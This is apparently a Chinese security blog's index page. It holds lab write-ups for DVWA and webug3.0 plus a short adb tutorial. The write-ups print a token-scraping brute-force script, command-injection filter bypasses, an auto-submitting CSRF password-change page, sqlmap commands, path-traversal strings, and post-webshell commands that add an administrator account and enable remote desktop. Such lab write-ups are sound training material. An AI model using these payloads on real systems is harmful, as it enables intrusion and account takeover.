<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="UltramanGaia&#39;s Blog">
<meta property="og:url" content="http://ultramangaia.github.io/index.html">
<meta property="og:site_name" content="UltramanGaia&#39;s Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="UltramanGaia&#39;s Blog">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://ultramangaia.github.io/"/>





  <title>UltramanGaia's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">UltramanGaia's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://ultramangaia.github.io/blog/2017/Kali-Linux-工具目录.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="UltramanGaia">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="UltramanGaia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/blog/2017/Kali-Linux-工具目录.html" itemprop="url">Kali Linux 工具目录</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-23T19:45:33+08:00">
                2017-12-23
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/信息安全/" itemprop="url" rel="index">
                    <span itemprop="name">信息安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://ultramangaia.github.io/blog/2017/adb基础使用.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="UltramanGaia">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="UltramanGaia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/blog/2017/adb基础使用.html" itemprop="url">adb基础使用</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-23T16:50:29+08:00">
                2017-12-23
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/教程/" itemprop="url" rel="index">
                    <span itemprop="name">教程</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="adb取出安装的软件"><a href="#adb取出安装的软件" class="headerlink" title="adb取出安装的软件"></a>adb取出安装的软件</h1><ol>
<li><p>查看设备</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb devices</span><br></pre></td></tr></table></figure>
</li>
<li><p>进入shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看已安装应用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm list packages</span><br></pre></td></tr></table></figure>
</li>
<li><p>找到apk的位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm path com.mimu.fm</span><br></pre></td></tr></table></figure>
</li>
<li><p>pull出应用包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit #退出shell</span><br><span class="line">adb pull /system/app/FM/FM.apk</span><br></pre></td></tr></table></figure>
</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://ultramangaia.github.io/blog/2017/DVWA-writeup.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="UltramanGaia">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="UltramanGaia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/blog/2017/DVWA-writeup.html" itemprop="url">DVWA writeup</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-05T20:00:04+08:00">
                2017-12-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/writeup/" itemprop="url" rel="index">
                    <span itemprop="name">writeup</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Damn-Vulnerable-Web-Application"><a href="#Damn-Vulnerable-Web-Application" class="headerlink" title="Damn Vulnerable Web Application"></a>Damn Vulnerable Web Application</h1><h2 id="暴力破解-Brute-Force"><a href="#暴力破解-Brute-Force" class="headerlink" title="暴力破解 Brute Force"></a>暴力破解 Brute Force</h2><p>重复猜密码（账号）</p>
<p>条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">弱密码。英文中的词、家的名字、过于简短的密码(6-7位)、可预测的模式</span><br><span class="line">验证过程没有难以绕过的验证码</span><br><span class="line">没有尝试多次后封IP地址等</span><br></pre></td></tr></table></figure></p>
<p>low：<br>直接获取参数拼接到sql语句中去了，然后sql注入的话，直接上sqlmap。<br>暴力破解，burpsuite抓包，发送到repeater，发现没有别的验证，直接可以暴力破解密码。<br>错误时有提示”Username and/or password incorrect”<br>尝试暴力破解admin账号的密码。<br>medium：<br>添加了mysqli_real_escape_string函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysqli_real_escape_string转义字符串中的特殊字符：</span><br><span class="line">  编码的字符是 NUL（ASCII 0）、\n、\r、\、&apos;、&quot; 和 Control-Z</span><br><span class="line">  如： &apos;  变成 \&apos;</span><br></pre></td></tr></table></figure></p>
<p>但是还是可以注入。<br>然后，增加了sleep(2)延时来一定程度上抑制暴力破解，但是其实是没有用的。<br>high:<br>添加了checkToken，burpsuite添加自动获取user_token比较麻烦，直接写个简单的python脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding: UTF-8 -*-</span><br><span class="line">import requests</span><br><span class="line">def read_token(html):</span><br><span class="line">	l = html.find(&quot;name=&apos;user_token&quot;)+25</span><br><span class="line">	print(l)</span><br><span class="line">	return html[l:l+32]</span><br><span class="line">url=&quot;http://hack.com/DVWA/vulnerabilities/brute/index.php?username=admin&amp;password=%s&amp;Login=Login&amp;user_token=%s&quot;</span><br><span class="line">passwords = [&apos;t&apos;,&apos;admin&apos;,&apos;123456&apos;,&apos;password&apos;,&apos;test&apos;]</span><br><span class="line">token = &apos;d6892bec17f92ebb73c5a57825c355e9&apos;</span><br><span class="line">for p in passwords:</span><br><span class="line">	print(p)</span><br><span class="line">	r = requests.get(url=url%(p,token),cookies=&#123;&apos;security&apos;:&apos;high&apos;, &apos;PHPSESSID&apos;:&apos;lu4qnvvftqnpjc4a2hf674juo2&apos;&#125;,headers=&#123;&apos;Referer&apos;:&apos;http://hack.com/DVWA/vulnerabilities/brute/index.php&apos;&#125;)</span><br><span class="line">	#print(r.text)</span><br><span class="line">	#file = open(p+&apos;.html&apos;,&apos;w&apos;)</span><br><span class="line">	#file.write(r.text)</span><br><span class="line">	#file.close</span><br><span class="line">	s = r.text</span><br><span class="line">	if s.find(&apos;Username and/or password incorrect.&apos;) == -1:</span><br><span class="line">		print(&apos;------Got it!!!&apos;)</span><br><span class="line">	token = read_token(s)</span><br><span class="line">	print(token)</span><br></pre></td></tr></table></figure></p>
<p>还是可以sqlmap注入，可能需要burpsuite的Macro配合下，但是貌似不用都行。。。</p>
<p>impossible:<br>添加stripslashes函数去除反斜杠，难道是防止宽字节注入，然后，sql语句是用了预编译，断绝了注入的想法，密码错了数次后上锁，暴力破解绝望。</p>
<h2 id="命令注入-Command-Injection"><a href="#命令注入-Command-Injection" class="headerlink" title="命令注入 Command Injection"></a>命令注入 Command Injection</h2><p>对用户数据过滤不严格导致的，可以通过构造特殊的数据进行攻击。可以直接用&amp;&amp;和;来执行多条命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;</span><br><span class="line">;</span><br><span class="line">||</span><br><span class="line">&amp;</span><br><span class="line">|</span><br></pre></td></tr></table></figure></p>
<p>low：<br>后台没有进行任何过滤，直接127.0.0.1&amp;&amp;dir就可以注入。&amp;&amp;或;<br>medium：<br>后台将&amp;&amp;和;替换为空，可以用||<br>high:<br>进行了更多的替换，然而，审视黑名单发现，将’| ‘替换为空，|后面有一个空格，所以，我们直接构造127.0.0.1 |dir 注意 |和dir之间没有空格即可。<br>impossible:<br>检验了保证IP地址都是数字，已经不能注入了。</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>跨站点请求伪造<br>当登陆等后，会生成一个会话，此时，可以通过会话验证登录的身份。<br>low:<br>没有进行任何验证，可以伪造网址发给朋友<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=mm.jpg&gt;</span><br><span class="line">&lt;iframe src=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=abc&amp;password_conf=abc&amp;Change=Change#&quot; frameborder=&quot;0&quot; ;0&quot; /&gt;</span><br></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>medium：<br>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。<br>检查HTTP_REFERER中是否包含SERVER_NAME直接将用于欺骗的网站的URL中包含有SERVER_NAME<br>如127.0.0.1.html<br>high:<br>采用了User_token来验证。<br>可以尝试利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    function attack()</span><br><span class="line">  &#123;</span><br><span class="line">   document.getElementsByName(&apos;user_token&apos;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&apos;user_token&apos;)[0].value;</span><br><span class="line">  document.getElementById(&quot;transfer&quot;).submit();</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;attack()&quot;&gt;</span><br><span class="line">  &lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf&quot;&gt;</span><br><span class="line">   &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;</span><br><span class="line">   &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt;</span><br><span class="line">  &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;</span><br><span class="line">   &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure></p>
<p>impossible:<br>需要输入当前密码才可以改密码。</p>
<h2 id="文件包含-File-Inclusion"><a href="#文件包含-File-Inclusion" class="headerlink" title="文件包含 File Inclusion"></a>文件包含 File Inclusion</h2><p>包含的文件无论文件后缀名是否为php，都会尝试当作php，如果真的不是，则打印文件内容。<br>所以，可能到时文件读取和代码执行。<br>low：<br>没有任何过滤。<br>medium：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">‘http://’ 替换为’https://&apos;\</span><br><span class="line">‘../‘、’..\”‘ 替换为 空</span><br></pre></td></tr></table></figure></p>
<p>high：<br>文件名需要符合file*或include.php<br>impossible：<br>白名单，没法子了。</p>
<h2 id="文件上传-File-Upload"><a href="#文件上传-File-Upload" class="headerlink" title="文件上传 File Upload"></a>文件上传 File Upload</h2><p>能够上传上去<br>能够执行<br>low:<br>直接上传一句话<br>medium:<br>上传的文件名限定了<br>high:<br>需要配合文件包含<br>impossible:<br>不安全的验证 Insecure CAPTCHA<br>验证过程中的逻辑漏洞。</p>
<h2 id="SQL-注入-SQL-Injection"><a href="#SQL-注入-SQL-Injection" class="headerlink" title="SQL 注入 SQL Injection"></a>SQL 注入 SQL Injection</h2><p>low:<br>什么都没有检测、过滤<br>medium：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_real_escape_string</span><br></pre></td></tr></table></figure></p>
<p>依旧注入、<br>high：<br>impossible：<br>POD</p>
<h2 id="SQL盲注-SQL-Injection-Blind"><a href="#SQL盲注-SQL-Injection-Blind" class="headerlink" title="SQL盲注 SQL Injection (Blind)"></a>SQL盲注 SQL Injection (Blind)</h2><p>sqlmap<br>Weak Session IDs<br>XSS (DOM)<br>反射型XSS (Reflected)<br>储存型XSS (Stored)</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://ultramangaia.github.io/blog/2017/webug3-0-writeup.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="UltramanGaia">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="UltramanGaia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/blog/2017/webug3-0-writeup.html" itemprop="url">webug3.0 writeup</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-04T19:46:57+08:00">
                2017-12-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/writeup/" itemprop="url" rel="index">
                    <span itemprop="name">writeup</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="渗透基础"><a href="#渗透基础" class="headerlink" title="渗透基础"></a>渗透基础</h1><h2 id="第一关-很简单的一个注入"><a href="#第一关-很简单的一个注入" class="headerlink" title="第一关:很简单的一个注入"></a>第一关:很简单的一个注入</h2><p>普通的GET注入<br>的确简单，丢个单引号就报错了，union注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u &quot;http://192.168.193.128/pentest/test/sqli/sqltamp.php?gid=1&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2&quot; --technique=U</span><br></pre></td></tr></table></figure>
<h2 id="第二关-从图片中你能找到什么？"><a href="#第二关-从图片中你能找到什么？" class="headerlink" title="第二关:从图片中你能找到什么？"></a>第二关:从图片中你能找到什么？</h2><p>从图片中找到有用的信息</p>
<p>binwalk、foremost可以发现rar，内有123.txt文件写着密码123<br>然后没思路，后台看到flag应该为<br><img src="/img/webug3/1.jpg" alt=""><br>flang{fa136c7c341a6e26}<br>加油</p>
<h2 id="第三关-你看到了什么？"><a href="#第三关-你看到了什么？" class="headerlink" title="第三关:你看到了什么？"></a>第三关:你看到了什么？</h2><p>渗透网站的时候目录也很重要</p>
<p>DirBuster扫下目录<br><img src="/img/webug3/2.png" alt=""></p>
<p>发现有这个目录</p>
<h2 id="第四关-告诉你了flang是5位数"><a href="#第四关-告诉你了flang是5位数" class="headerlink" title="第四关:告诉你了flang是5位数"></a>第四关:告诉你了flang是5位数</h2><p>当遇到五位验证码的时候可以爆破<br>没有看到验证码。。。考虑应该是考查爆破验证码，题目没出好吧</p>
<h2 id="第五关-一个优点小小的特殊的注入"><a href="#第五关-一个优点小小的特殊的注入" class="headerlink" title="第五关:一个优点小小的特殊的注入"></a>第五关:一个优点小小的特殊的注入</h2><p>头部的一个注入<br>看到头部注入就想到X-Forwarded-For 和 User-Agent<br><img src="/img/webug3/3.png" alt=""></p>
<h2 id="第六关-这关需要rmb购买哦"><a href="#第六关-这关需要rmb购买哦" class="headerlink" title="第六关:这关需要rmb购买哦"></a>第六关:这关需要rmb购买哦</h2><p>支付问题：用最少的钱去购买到一本书！<br>随便输入admin/admin进去发现登录失败跳转，但是看返回包，后面的内容居然还是出现了，<br>估计是后台只是设置了跳转，没有die，还会执行后面的内容<br>禁用跳转后<br><img src="/img/webug3/4.png" alt=""></p>
<p>点击购买发现提示用户没登录<br><img src="/img/webug3/5.png" alt=""></p>
<p>改下uid<br><img src="/img/webug3/6.png" alt=""></p>
<p>成功用别人的钱买书了<br>可是题目说是”用最少的钱去购买到一本书”<br>改金额，金额改为0<br><img src="/img/webug3/7.png" alt=""></p>
<h2 id="第七关-越权"><a href="#第七关-越权" class="headerlink" title="第七关:越权"></a>第七关:越权</h2><p>已有账号：tom 密码123456<br><img src="/img/webug3/8.png" alt=""></p>
<p>并没有验证原密码，这直接修改即可越权</p>
<h2 id="第八关-CSRF"><a href="#第八关-CSRF" class="headerlink" title="第八关:CSRF"></a>第八关:CSRF</h2><p>管理员每天晚上十点上线<br><img src="/img/webug3/9.png" alt=""></p>
<p>burpsuite生成CSRF POC</p>
<h2 id="第九关-URL跳转"><a href="#第九关-URL跳转" class="headerlink" title="第九关:URL跳转"></a>第九关:URL跳转</h2><p>能不能从我到百度那边去？<br>额，需要提交参数url即可，怎么想到的呢！</p>
<h2 id="第十关-文件下载"><a href="#第十关-文件下载" class="headerlink" title="第十关:文件下载"></a>第十关:文件下载</h2><p>根据提示下载需要的文件<br>题目链接应该换成这个</p>
<p>很明显的任意文件读取，直接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/webug3/10.png" alt=""></p>
<p>各种读文件，有连接数据库的php文件，顺着可以找到config文件，读到数据库密码的。</p>
<h2 id="第十一关-我和上一题有点像"><a href="#第十一关-我和上一题有点像" class="headerlink" title="第十一关:我和上一题有点像"></a>第十一关:我和上一题有点像</h2><p>boom，沙卡拉卡！<br>GET换成了POST<br><img src="/img/webug3/11.png" alt=""></p>
<h2 id="第十二关-我系统密码忘记了！"><a href="#第十二关-我系统密码忘记了！" class="headerlink" title="第十二关:我系统密码忘记了！"></a>第十二关:我系统密码忘记了！</h2><p>请帮我找回在D盘下。<br>直接上传webshell<br><img src="/img/webug3/12.png" alt=""></p>
<p>菜刀连接，跳转到D盘出错了</p>
<ol>
<li><p>新建一个用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># net user [username] [password] /add</span><br><span class="line">net user systemis systemis /add</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加到Administrators用户组</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># net localgroup Administrators [username] /add</span><br><span class="line">net localgroup Administrators systemis /add</span><br></pre></td></tr></table></figure>
</li>
<li><p>开启3389</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>mstsc连接远程桌面<br><img src="/img/webug3/13.png" alt=""></p>
<p>还是访问不到D盘，设备未就绪，应该是没插入光盘吧</p>
<h2 id="第十三关-XSS"><a href="#第十三关-XSS" class="headerlink" title="第十三关:XSS"></a>第十三关:XSS</h2><p>看看你能给我带来什么惊喜？<br><img src="/img/webug3/14.png" alt=""></p>
<h2 id="第十四关-存储型XSS"><a href="#第十四关-存储型XSS" class="headerlink" title="第十四关:存储型XSS"></a>第十四关:存储型XSS</h2><p>suprise！<br>GET 换成 POST一样<br><img src="/img/webug3/15.png" alt=""></p>
<h2 id="第十五关-什么？图片上传不了？"><a href="#第十五关-什么？图片上传不了？" class="headerlink" title="第十五关:什么？图片上传不了？"></a>第十五关:什么？图片上传不了？</h2><p>上传不了图片怎么办？<br>改<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/png</span><br></pre></td></tr></table></figure></p>
<p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.85.128/pentest/test/11/upload/webshell0.php</span><br></pre></td></tr></table></figure></p>
<h2 id="第十六关-明天双十一"><a href="#第十六关-明天双十一" class="headerlink" title="第十六关:明天双十一"></a>第十六关:明天双十一</h2><p>我从公司网络去剁手了！<br><img src="/img/webug3/16.png" alt=""></p>
<p>想不到既需要host为10.10.10.10<br>又验证了referer是来自www.baidu.com<br>这里的设置真的不甚理解。</p>
<h1 id="中级进阶"><a href="#中级进阶" class="headerlink" title="中级进阶"></a>中级进阶</h1><h2 id="第一关-出来点东西吧"><a href="#第一关-出来点东西吧" class="headerlink" title="第一关:出来点东西吧"></a>第一关:出来点东西吧</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../etc/passwd</span><br></pre></td></tr></table></figure>
<p>系统是windows，所以应该是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../../../../../../../WINDOWS/win.ini</span><br></pre></td></tr></table></figure></p>
